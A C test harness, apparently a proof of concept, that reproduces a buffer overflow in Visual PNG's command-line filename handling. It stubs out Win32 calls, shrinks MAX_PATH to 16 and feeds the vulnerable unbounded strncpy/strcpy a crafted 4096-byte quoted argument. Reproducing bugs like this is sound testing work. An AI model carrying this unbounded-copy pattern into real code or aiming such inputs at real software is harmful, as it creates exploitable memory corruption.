#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Minimal Windows-like type and macro stubs to compile on non-Windows */
typedef void* HINSTANCE;
typedef void* HACCEL;
typedef void* HWND;
typedef void* HBRUSH;
typedef unsigned int UINT;
typedef unsigned long WPARAM;
typedef long LPARAM;
typedef long LRESULT;
typedef char* PSTR;

#define WINAPI
#define CALLBACK

#define CS_HREDRAW 0x0001
#define CS_VREDRAW 0x0002
#define IDC_ARROW  32512
#define WS_OVERLAPPEDWINDOW 0
#define CW_USEDEFAULT 0
#define SM_CXBORDER 0
#define SM_CXDLGFRAME 0
#define SM_CYBORDER 0
#define SM_CYDLGFRAME 0
#define SM_CYCAPTION 0
#define SM_CYMENUSIZE 0
#define MB_ICONERROR 0

#define TEXT(x) (x)

/* Make MAX_PATH intentionally small so overflow is easy to observe */
#ifndef MAX_PATH
#define MAX_PATH 16
#endif

#define PROGNAME "visupng"
#define LONGNAME "Visual PNG"
#define MARGIN 0

/* Minimal WNDCLASS and MSG definitions */
typedef struct _WNDCLASS {
    UINT       style;
    LRESULT  (*lpfnWndProc)(HWND, UINT, WPARAM, LPARAM);
    int        cbClsExtra;
    int        cbWndExtra;
    HINSTANCE  hInstance;
    void*      hIcon;
    void*      hCursor;
    HBRUSH     hbrBackground;
    const char* lpszMenuName;
    const char* lpszClassName;
} WNDCLASS;

typedef struct _MSG {
    WPARAM wParam;
} MSG;

/* Stubs for Win32 API used by VisualPng.c */
static int RegisterClass(WNDCLASS* cls) { (void)cls; return 1; }
static int MessageBox(void* a, const char* b, const char* c, unsigned int d) {
    (void)a; (void)b; (void)c; (void)d; return 0;
}
static void* LoadIcon(HINSTANCE a, const char* b){ (void)a; (void)b; return NULL; }
static void* LoadCursor(void* a, int b){ (void)a; (void)b; return NULL; }
static int GetSystemMetrics(int a){ (void)a; return 0; }
static HWND CreateWindow(const char* a, const char* b, unsigned long c,
                         int d, int e, int f, int g,
                         void* h, void* i, HINSTANCE j, void* k) {
    (void)a; (void)b; (void)c; (void)d; (void)e; (void)f; (void)g;
    (void)h; (void)i; (void)j; (void)k; return (HWND)1;
}
static void ShowWindow(HWND a, int b){ (void)a; (void)b; }
static void UpdateWindow(HWND a){ (void)a; }
static HACCEL LoadAccelerators(HINSTANCE a, const char* b){ (void)a; (void)b; return (HACCEL)0; }
static int GetMessage(MSG* a, HWND b, int c, int d){ (void)a; (void)b; (void)c; (void)d; return 0; }
static int TranslateAccelerator(HWND a, HACCEL b, MSG* c){ (void)a; (void)b; (void)c; return 0; }
static void TranslateMessage(MSG* a){ (void)a; }
static void DispatchMessage(MSG* a){ (void)a; }

/* Forward declaration of WndProc */
static LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);

/* ------------------------------------------------------------------ */
/* The vulnerable code from contrib/visupng/VisualPng.c, pared down   */
/* ------------------------------------------------------------------ */

static char *szProgName = PROGNAME;
static char *szAppName = LONGNAME;
static char *szIconName = PROGNAME;
static char szCmdFileName [MAX_PATH];

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdLine, int iCmdShow)
{
    HACCEL   hAccel;
    HWND     hwnd;
    MSG      msg;
    WNDCLASS wndclass;
    int ixBorders, iyBorders;

    (void)hPrevInstance; /* unused in this stub */

    wndclass.style         = CS_HREDRAW | CS_VREDRAW;
    wndclass.lpfnWndProc   = WndProc;
    wndclass.cbClsExtra    = 0;
    wndclass.cbWndExtra    = 0;
    wndclass.hInstance     = hInstance;
    wndclass.hIcon         = LoadIcon (hInstance, szIconName) ;
    wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW);
    wndclass.hbrBackground = NULL; /* (HBRUSH) GetStockObject (GRAY_BRUSH); */
    wndclass.lpszMenuName  = szProgName;
    wndclass.lpszClassName = szProgName;

    if (!RegisterClass (&wndclass))
    {
        MessageBox (NULL, TEXT ("Error: this program requires Windows NT!"),
            szProgName, MB_ICONERROR);
        return 0;
    }

    /* if filename given on command line, store it */
    if ((szCmdLine != NULL) && (*szCmdLine != '\0'))
        if (szCmdLine[0] == '"')
            /* VULNERABLE: no bound against MAX_PATH and no forced NUL */
            strncpy (szCmdFileName, szCmdLine + 1, strlen(szCmdLine) - 2);
        else
            strcpy (szCmdFileName, szCmdLine);
    else
        strcpy (szCmdFileName, "");

    /* The rest is irrelevant for the overflow; keep minimal stubs */
    ixBorders = 2 * (GetSystemMetrics (SM_CXBORDER) +
                     GetSystemMetrics (SM_CXDLGFRAME));
    iyBorders = 2 * (GetSystemMetrics (SM_CYBORDER) +
                     GetSystemMetrics (SM_CYDLGFRAME)) +
                     GetSystemMetrics (SM_CYCAPTION) +
                     GetSystemMetrics (SM_CYMENUSIZE) +
                     1; /* WvS: don't ask me why?  */

    hwnd = CreateWindow (szProgName, szAppName,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        512 + 2 * MARGIN + ixBorders, 384 + 2 * MARGIN + iyBorders,
        NULL, NULL, hInstance, NULL);

    ShowWindow (hwnd, iCmdShow);
    UpdateWindow (hwnd);

    hAccel = LoadAccelerators (hInstance, szProgName);

    while (GetMessage (&msg, NULL, 0, 0))
    {
        if (!TranslateAccelerator (hwnd, hAccel, &msg))
        {
            TranslateMessage (&msg);
            DispatchMessage (&msg);
        }
    }
    return (int)msg.wParam;
}

static LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam,
        LPARAM lParam)
{
    (void)hwnd; (void)message; (void)wParam; (void)lParam; return 0;
}

int main(void) {
    /* Craft a quoted command line with content much larger than MAX_PATH */
    const size_t inner_len = 4096; /* far larger than MAX_PATH (16) */
    char* cmd = (char*)malloc(inner_len + 3); /* opening quote + content + closing quote + NUL */
    if (!cmd) {
        perror("malloc");
        return 1;
    }
    size_t i = 0;
    cmd[i++] = '"';
    memset(cmd + i, 'A', inner_len);
    i += inner_len;
    cmd[i++] = '"';
    cmd[i++] = '\0';

    /* Call the vulnerable WinMain as the original program would */
    int ret = WinMain(NULL, NULL, cmd, 0);

    /* Avoid optimizing away usage */
    fprintf(stderr, "Returned: %d\n", ret);

    free(cmd);
    return 0;
}
